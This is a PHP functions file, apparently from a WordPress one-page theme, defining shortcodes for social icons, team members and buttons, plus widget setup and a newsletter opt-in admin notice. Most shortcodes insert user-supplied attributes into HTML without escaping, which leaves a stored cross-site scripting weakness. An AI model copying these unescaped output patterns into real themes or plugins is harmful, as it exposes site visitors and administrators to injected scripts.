    return '<li><a style="background-color:' . $bg_color . '" href="' . $href . '" title="' . $title . '" target="_blank"><i class="' . $icon_class . '"></i></a></li>';
}

add_shortcode('header_social_icon', 'header_social_icons_shortcode');

/**
 * Footer Section Social Icons shortcode
 */
function footer_social_icons_shortcode($atts, $content = null) {
    extract(shortcode_atts(array(
        'href' => '#',
        'bg_color' => '#fff',
        'title' => '',
        'icon_class' => '',
        'delay' => ''
                    ), $atts));
    return '<li><a class="animated bounce" style="background-color:' . $bg_color . ';animation-delay:' . $delay . ';" href="' . $href . '" title="' . $title . '" target="_blank"><i class="' . $icon_class . '"></i></a></li>';
}

add_shortcode('footer_social_icon', 'footer_social_icons_shortcode');

/**
 * Team members shortcode
 */
function team_members_wrapper_shortcode($atts, $content = null) {
    extract(shortcode_atts(array(
        'delay' => ''
                    ), $atts));
    return '<div class="ddd  col-md-3 col-sm-6"><div class="team_item animated bounce" style="animation-delay:' . $delay . ';">' . do_shortcode($content) . '</div></div>';
}

add_shortcode('team_wrapper', 'team_members_wrapper_shortcode');

function team_member_image($atts, $content = null) {
    extract(shortcode_atts(array(
        'img_src' => '',
        'caption_text' => ''
                    ), $atts));
    return '<div class="team_image"><img src="' . $img_src . '"/><div class="team_caption"><p>' . $caption_text . '</p></div></div>' . $content;
}

add_shortcode('member_image', 'team_member_image');

function team_member_info($atts, $content = null) {
    extract(shortcode_atts(array(
        'name' => '',
        'designation' => ''
                    ), $atts));
    return '<h4>' . $name . '</h4><span>' . $designation . '</span>';
}

add_shortcode('member_info', 'team_member_info');

function team_member_social_icon_info($atts, $content = null) {
    extract(shortcode_atts(array(
        'fb_link' => '',
        'g_plus_link' => '',
        'tw_link' => '',
        'ln_link' => ''
                    ), $atts));

    return '<ul class = "team_social" style="background-color:' . onepage_get_option('onepage_team_social_icons_bg_color', '#2bb6b6') . ';"><li><a href="' . $fb_link . '"><i class="fa fa-fw fa-facebook"></i></a></li><li><a href="' . $g_plus_link . '"><i class="fa fa-fw fa-google-plus"></i></a></li><li><a href="' . $tw_link . '"><i class="fa fa-fw fa-twitter"></i></a></li><li><a href="' . $ln_link . '"><i class="fa fa-fw fa-linkedin"></i></a></li></ul>';
}

add_shortcode('social_links', 'team_member_social_icon_info');

/**
 * Buttons shortcode
 */
function button_shortcode($atts, $content = null) {
    extract(shortcode_atts(array(
        'href' => '#',
        'btn_class' => '',
        'bg_color' => '',
        'text_color' => '',
                    ), $atts));
    return '<a href="' . $href . '"><button class="btn btn-danger ' . $btn_class . '" style="background-color:' . $bg_color . '; color :' . $text_color . ';">' . wp_kses_post(do_shortcode($content)) . '</button></a>';
}

add_shortcode('button', 'button_shortcode');

/**
 * Header Behaviour changer
 */
function header_position_updater() {
    echo "<style>.header{position: static !important;}body#page-top{padding-top: 0 !important;}</style>";
}

if (onepage_get_option('onepage_header_position', 'fixed') == 'static'):
    add_action('wp_head', 'header_position_updater');
endif;

/**
 * Set new widgets on theme activate
 * @param string $old_theme
 * @param WP_Theme $WP_theme
 */
function set_default_theme_widgets() {
    $sidebar_option = get_option('sidebars_widgets');
    if ($sidebar_option && empty($sidebar_option['hp-section-sorting-widget-area'])) {
        $widget_blog = array();
        $widget_blog[1] = array();
        $widget_blog['_multiwidget'] = '1';
        update_option('widget_service_section', $widget_blog);
        update_option('widget_blogs_section', $widget_blog);
        update_option('widget_portfolio_section', $widget_blog);
        update_option('widget_video_section', $widget_blog);
        update_option('widget_testimonial_section', $widget_blog);
        update_option('widget_pricing_section', $widget_blog);
        update_option('widget_teams_section', $widget_blog);
        update_option('widget_contactus_section', $widget_blog);
        $sidebars_widgets["hp-section-sorting-widget-area"] = array(
            "service_section-1",
            "blogs_section-1",
            "portfolio_section-1",
            "video_section-1",
            "testimonial_section-1",
            "pricing_section-1",
            "teams_section-1",
            "contactus_section-1"
        );
//     save new widgets to DB
        update_option('sidebars_widgets', $sidebars_widgets);
    }
}

//set_default_theme_widgets();
add_action('after_setup_theme', 'set_default_theme_widgets');

// Sanitize html/iframe shortcodes
function onepage_sanitize_html($value) {
    $array = wp_kses_allowed_html('post');
    $allowedtags = array(
        'iframe' => array(
            'width' => array(),
            'height' => array(),
            'frameborder' => array(),
            'scrolling' => array(),
            'src' => array(),
            'marginwidth' => array(),
            'marginheight' => array()
        )
    );
    $data = array_merge($allowedtags, $array);
    $value = wp_kses($value, $data);
    return do_shortcode($value);
}

function onepage_tracking_admin_notice() {
    global $current_user;
    $user_id = $current_user->ID;
    /* Check that the user hasn't already clicked to ignore the message */
    if (!get_user_meta($user_id, 'wp_email_tracking_ignore_notice')) {
        ?>
        <div class="updated um-admin-notice"><p><?php _e('Allow Colorway theme to send you setup guide? Opt-in to our newsletter and we will immediately e-mail you a setup guide along with 20% discount which you can use to purchase any theme.', 'one-page'); ?></p><p><a href="<?php echo ONEPAGE_DIR_URI . 'includes/smtp.php?wp_email_tracking=email_smtp_allow_tracking'; ?>" class="button button-primary"><?php _e('Allow Sending', 'one-page'); ?></a>&nbsp;<a href="<?php echo ONEPAGE_DIR_URI . 'includes/smtp.php?wp_email_tracking=email_smtp_hide_tracking'; ?>" class="button-secondary"><?php _e('Do not allow', 'one-page'); ?></a></p></div>
        <?php
    }
}

add_action('admin_notices', 'onepage_tracking_admin_notice');
